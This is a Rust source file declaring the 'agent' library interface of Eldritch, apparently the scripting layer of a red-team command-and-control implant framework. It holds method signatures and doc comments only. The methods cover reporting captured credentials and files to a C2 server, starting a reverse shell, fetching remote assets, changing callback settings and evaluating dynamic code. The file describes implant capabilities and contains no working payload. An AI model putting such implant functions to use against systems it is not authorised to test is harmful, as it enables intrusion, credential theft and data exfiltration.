#![allow(clippy::mutable_key_type)]
extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::{Interpreter, Value};
use eldritch_macros::{eldritch_library, eldritch_method};

use alloc::collections::BTreeMap;

#[cfg(feature = "fake_bindings")]
pub mod fake;

#[cfg(feature = "stdlib")]
pub mod agent;
#[cfg(feature = "stdlib")]
pub mod conversion;
#[cfg(feature = "stdlib")]
pub mod std;

#[cfg(not(feature = "stdlib"))]
pub mod conversion_fake;

#[cfg(feature = "stdlib")]
use conversion::*;

#[cfg(not(feature = "stdlib"))]
use conversion_fake::*;

#[cfg(test)]
mod tests;

// Re-export wrappers so modules can use them (but they are internal to crate if not pub)
// Wait, `conversion` and `conversion_fake` define public structs.
// We need to make sure they are accessible.

#[eldritch_library("agent")]
/// The `agent` library provides capabilities for interacting with the agent's internal state, configuration, and task management.
///
/// It allows you to:
/// - Modify agent configuration (callback intervals, transports).
/// - Manage background tasks.
/// - Report data back to the C2 server (though the `report` library is often preferred for high-level reporting).
/// - Control agent execution (termination).
pub trait AgentLibrary {
    #[eldritch_method]
    /// Returns the current configuration of the agent as a dictionary.
    ///
    /// **Returns**
    /// - `Dict<String, Value>`: A dictionary containing configuration keys and values.
    ///
    /// **Errors**
    /// - Returns an error string if the configuration cannot be retrieved or is not implemented.
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String>;

    #[eldritch_method]
    /// Returns the unique identifier (ID) of the agent.
    ///
    /// **Returns**
    /// - `str`: The agent's ID.
    ///
    /// **Errors**
    /// - Returns an error string if the ID cannot be retrieved or is not implemented.
    fn get_id(&self) -> Result<String, String>;

    #[eldritch_method]
    /// Returns the platform identifier the agent is running on.
    ///
    /// **Returns**
    /// - `str`: The platform string (e.g., "linux", "windows").
    ///
    /// **Errors**
    /// - Returns an error string if the platform cannot be determined or is not implemented.
    fn get_platform(&self) -> Result<String, String>;

    #[eldritch_method]
    /// **DANGER**: Terminates the agent process immediately.
    ///
    /// This method calls `std::process::exit(0)`, effectively killing the agent.
    /// Use with extreme caution.
    ///
    /// **Returns**
    /// - `None` (Does not return as the process exits).
    ///
    /// **Errors**
    /// - This function is unlikely to return an error, as it terminates the process.
    fn _terminate_this_process_clowntown(&self) -> Result<(), String>;

    #[eldritch_method]
    /// Updates the agent's configuration with the provided dictionary.
    ///
    /// **Parameters**
    /// - `config` (`Dict<String, Value>`): A dictionary of configuration keys and values to update.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the configuration cannot be updated or is not implemented.
    fn set_config(&self, config: BTreeMap<String, Value>) -> Result<(), String>;

    #[eldritch_method]
    fn set_callback_uri(&self, uri: String) -> Result<(), String>;

    // Interactivity
    #[eldritch_method]
    /// Fetches an asset (file) from the C2 server by name.
    ///
    /// This method requests the asset content from the server.
    ///
    /// **Parameters**
    /// - `name` (`str`): The name of the asset to fetch.
    ///
    /// **Returns**
    /// - `Bytes`: The content of the asset as a byte array.
    ///
    /// **Errors**
    /// - Returns an error string if the asset cannot be fetched or communication fails.
    fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String>;

    #[eldritch_method]
    /// Reports a captured credential to the C2 server.
    ///
    /// **Parameters**
    /// - `credential` (`Credential`): The credential object to report.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the reporting fails.
    fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String>;

    #[eldritch_method]
    /// Reports a file (chunk) to the C2 server.
    ///
    /// This is typically used internally by `report.file`.
    ///
    /// **Parameters**
    /// - `file` (`File`): The file chunk wrapper to report.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the reporting fails.
    fn report_file(&self, file: FileWrapper) -> Result<(), String>;

    #[eldritch_method]
    /// Reports a list of processes to the C2 server.
    ///
    /// This is typically used internally by `report.process_list`.
    ///
    /// **Parameters**
    /// - `list` (`ProcessList`): The process list wrapper to report.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the reporting fails.
    fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String>;

    #[eldritch_method]
    /// Reports the output of a task to the C2 server.
    ///
    /// This is used to send stdout/stderr or errors back to the controller.
    ///
    /// **Parameters**
    /// - `output` (`str`): The standard output content.
    /// - `error` (`Option<str>`): Optional error message.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the reporting fails.
    fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String>;

    #[eldritch_method]
    /// Initiates a reverse shell session.
    ///
    /// This starts a reverse shell based on the agent's capabilities (e.g., PTY or raw).
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the reverse shell cannot be started.
    fn reverse_shell(&self) -> Result<(), String>;

    #[eldritch_method]
    /// Manually triggers a check-in to claim pending tasks from the C2 server.
    ///
    /// **Returns**
    /// - `List<Task>`: A list of tasks retrieved from the server.
    ///
    /// **Errors**
    /// - Returns an error string if the check-in fails.
    fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    // Agent Configuration
    #[eldritch_method]
    /// Returns the name of the currently active transport.
    ///
    /// **Returns**
    /// - `str`: The name of the transport (e.g., "http", "grpc").
    ///
    /// **Errors**
    /// - Returns an error string if the transport cannot be identified.
    fn get_transport(&self) -> Result<String, String>;

    #[eldritch_method]
    /// Switches the agent to use the specified transport.
    ///
    /// **Parameters**
    /// - `transport` (`str`): The name of the transport to switch to.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the transport is unknown or cannot be activated.
    fn set_transport(&self, transport: String) -> Result<(), String>;

    #[eldritch_method]
    /// Returns a list of available transport names.
    ///
    /// **Returns**
    /// - `List<str>`: A list of transport names.
    ///
    /// **Errors**
    /// - Returns an error string if the list cannot be retrieved.
    fn list_transports(&self) -> Result<Vec<String>, String>;

    #[eldritch_method]
    /// Returns the current callback interval in seconds.
    ///
    /// **Returns**
    /// - `int`: The interval in seconds.
    ///
    /// **Errors**
    /// - Returns an error string if the interval cannot be retrieved.
    fn get_callback_interval(&self) -> Result<i64, String>;

    #[eldritch_method]
    /// Sets the callback interval for the agent.
    ///
    /// This configuration change is typically transient and may not persist across reboots.
    ///
    /// **Parameters**
    /// - `interval` (`int`): The new interval in seconds.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the interval cannot be set.
    fn set_callback_interval(&self, interval: i64) -> Result<(), String>;

    // Task Management
    #[eldritch_method]
    /// Lists the currently running or queued background tasks on the agent.
    ///
    /// **Returns**
    /// - `List<Task>`: A list of task objects.
    ///
    /// **Errors**
    /// - Returns an error string if the task list cannot be retrieved.
    fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    #[eldritch_method]
    /// Stops a specific background task by its ID.
    ///
    /// **Parameters**
    /// - `task_id` (`int`): The ID of the task to stop.
    ///
    /// **Returns**
    /// - `None`
    ///
    /// **Errors**
    /// - Returns an error string if the task cannot be stopped or does not exist.
    fn stop_task(&self, task_id: i64) -> Result<(), String>;

    #[eldritch_method]
    /// Evaluates the provided Eldritch code using the current interpreter instance.
    ///
    /// This method allows the agent to execute dynamic code within the current context.
    ///
    /// **Parameters**
    /// - `code` (`str`): The Eldritch code to evaluate.
    ///
    /// **Returns**
    /// - `Value`: The result of the evaluation.
    ///
    /// **Errors**
    /// - Returns an error string if the code execution fails.
    fn eval(&self, interp: &mut Interpreter, code: String) -> Result<Value, String>;
}
